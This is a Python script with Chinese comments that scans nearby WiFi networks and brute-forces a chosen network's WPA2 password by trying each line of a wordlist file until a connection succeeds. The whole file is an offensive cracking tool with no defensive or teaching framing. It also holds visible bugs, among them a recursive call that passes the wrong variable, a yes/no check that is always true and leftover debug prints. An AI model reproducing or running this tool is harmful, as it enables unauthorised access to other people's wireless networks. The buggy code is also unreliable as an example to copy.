import time
import re
import os
import pywifi
from pywifi import const

wifi = pywifi.PyWiFi()
iface = wifi.interfaces()[0]
wifi_list = {}
password = ""

# 扫描附近WiFi
def scan():
    count = 1
    iface.scan()
    results = iface.scan_results()
    ssid_list = {}

    for data in results:
        if data.ssid == "":
            continue
        else:
            ssid_list[data.ssid] = data.signal

    print(f"---已找到{len(ssid_list)}个可用WiFi---")
    print("编号 | 强度 |   名称")

    for ssid in ssid_list:
        print(f" {count}   | {ssid_list[ssid]}  | {ssid}")
        wifi_list[count] = ssid
        count += 1

# 连接网络
def connect(wifi_id, path):
    if path == "":
        print("你尚未输入密码本路径！")
        path = input("输入密码本路径:")
        connect(wifi, path)
    elif not re.match(".*\.txt$", path):
        while 1:
            ask_find = input("你输入的似乎是个目录？是否开始查找文件名(Y/N)")
            if ask_find == "Y" or "y":
                path = find_file(path)
                break
            elif ask_find == "N" or "n":
                break
            else:
                print("请输入Y/N")

    # 初始化无线网卡
    iface.disconnect()
    profile = pywifi.Profile()
    profile.ssid = wifi_list[wifi_id]
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    # 暴力破解
    try:
        with open(path, "r") as f:
            print("正在连接WiFi:",wifi_list[wifi_id])
            while 1:
                password = f.readline()
                password = password[:-1]
                if password == "":
                    print("字典内未包含该WiFi密码。")
                    break

                profile.key = password
                iface.remove_all_network_profiles()
                profile = iface.add_network_profile(profile)
                iface.connect(profile)
                print(f"正在尝试:{password}")
                time.sleep(1)

                if iface.status() == const.IFACE_CONNECTED:
                    print(f"连接成功！WiFi密码:{password}")
                    break
    except FileNotFoundError:
        print("未查找到指定的密码本！")
    except TypeError:
        print("路径有误！")

# 查找功能
def find_file(root):
    while 1:
        target = input("输入密码本文件名:")
        if target == "":
            print("文件名不能为空！")
        else:
            break
    for root,dirs,files in os.walk(root):
        print(1)
        for file in files:
            print(2)
            if target in file:
                print(file)
                path = os.path.join(root,file)
                print("查找成功！密码本路径:",path)
                return path

if __name__ == '__main__':
    scan()
    wifi = int(input("输入WiFi编号:"))
    path = input("输入密码本路径:")
    connect(wifi, path)
